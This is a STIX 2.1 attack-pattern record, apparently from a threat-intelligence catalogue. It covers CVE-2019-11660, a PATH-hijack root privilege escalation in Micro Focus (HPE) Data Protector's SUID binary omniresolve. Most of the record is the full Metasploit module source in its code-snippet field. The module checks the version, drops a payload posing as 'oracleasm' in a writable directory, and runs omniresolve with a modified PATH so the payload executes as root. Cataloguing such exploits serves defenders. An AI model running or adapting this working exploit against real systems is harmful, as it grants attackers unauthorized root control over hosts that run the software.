{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d0e1301-0079-4aa7-afea-950cccb0e1b7",
    "created": "2024-08-14T16:59:38.255546Z",
    "modified": "2024-08-14T16:59:38.25555Z",
    "name": "Micro Focus (HPE) Data Protector SUID Privilege Escalation",
    "description": " This module exploits the trusted `$PATH` environment variable of the SUID binary `omniresolve` in Micro Focus (HPE) Data Protector A.10.40 and prior.  The `omniresolve` executable calls the `oracleasm` binary using a relative path and the trusted environment `$PATH`, which allows an attacker to execute a custom binary with `root` privileges.  This module has been successfully tested on: HPE Data Protector A.09.07: OMNIRESOLVE, internal build 110, built on Thu Aug 11 14:52:38 2016; Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 118, built on Tue May 21 05:49:04 2019 on CentOS Linux release 7.6.1810 (Core)  The vulnerability has been patched in: Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 125, built on Mon Aug 19 19:22:20 2019  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/omniresolve_suid_priv_esc.rb",
            "external_id": "omniresolve_suid_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-11660"
        },
        {
            "source_name": "reference",
            "url": "https://softwaresupport.softwaregrp.com/doc/KM03525630"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Micro Focus (HPE) Data Protector SUID Privilege Escalation',\n        'Description' => %q{\n          This module exploits the trusted `$PATH` environment\n          variable of the SUID binary `omniresolve` in\n          Micro Focus (HPE) Data Protector A.10.40 and prior.\n\n          The `omniresolve` executable calls the `oracleasm` binary using\n          a relative path and the trusted environment `$PATH`, which allows\n          an attacker to execute a custom binary with `root` privileges.\n\n          This module has been successfully tested on:\n          HPE Data Protector A.09.07: OMNIRESOLVE, internal build 110, built on Thu Aug 11 14:52:38 2016;\n          Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 118, built on Tue May 21 05:49:04 2019 on CentOS Linux release 7.6.1810 (Core)\n\n          The vulnerability has been patched in:\n          Micro Focus Data Protector A.10.40: OMNIRESOLVE, internal build 125, built on Mon Aug 19 19:22:20 2019\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          's7u55', # Discovery and Metasploit module\n        ],\n        'DisclosureDate' => '2019-09-13',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [\n          [\n            'Micro Focus (HPE) Data Protector <= 10.40 build 118',\n            { upper_version: Rex::Version.new('10.40') }\n          ]\n        ],\n        'DefaultOptions' => {\n          'PrependSetgid' => true,\n          'PrependSetuid' => true\n        },\n        'References' => [\n          [ 'CVE', '2019-11660' ],\n          [ 'URL', 'https://softwaresupport.softwaregrp.com/doc/KM03525630' ]\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('SUID_PATH', [ true, 'Path to suid executable omniresolve', '/opt/omni/lbin/omniresolve' ])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n      ]\n    )\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def suid_bin_path\n    datastore['SUID_PATH'].to_s\n  end\n\n  def check\n    return CheckCode::Safe(\"#{suid_bin_path} file not found\") unless file? suid_bin_path\n    return CheckCode::Safe(\"#{suid_bin_path} is not setuid\") unless setuid? suid_bin_path\n\n    info = cmd_exec(\"#{suid_bin_path} -ver\").to_s\n    if info =~ /(?<=\\w\\.)(\\d\\d\\.\\d\\d)(.*)(?<=build )(\\d\\d\\d)/\n      version = '%.2f' % ::Regexp.last_match(1).to_f\n      build = ::Regexp.last_match(3).to_i\n      vprint_status(\"omniresolve version #{version} build #{build}\")\n\n      unless Rex::Version.new(version) < target[:upper_version] ||\n             (Rex::Version.new(version) == target[:upper_version] && build <= 118)\n        return CheckCode::Safe\n      end\n\n      return CheckCode::Appears\n    end\n\n    vprint_error('Could not parse omniresolve -ver output')\n    CheckCode::Detected\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    payload_path = File.join(base_dir, 'oracleasm')\n    register_file_for_cleanup(payload_path)\n    write_file(payload_path, generate_payload_exe)\n    chmod(payload_path)\n\n    trigger_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))\n    register_file_for_cleanup(trigger_path)\n    write_file(trigger_path, \"#{rand_text_alpha(5..10)}:#{rand_text_alpha(5..10)}\")\n    cmd_exec(\"env PATH=\\\"#{base_dir}:$PATH\\\" #{suid_bin_path} -i #{trigger_path} & echo \")\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-09-13",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}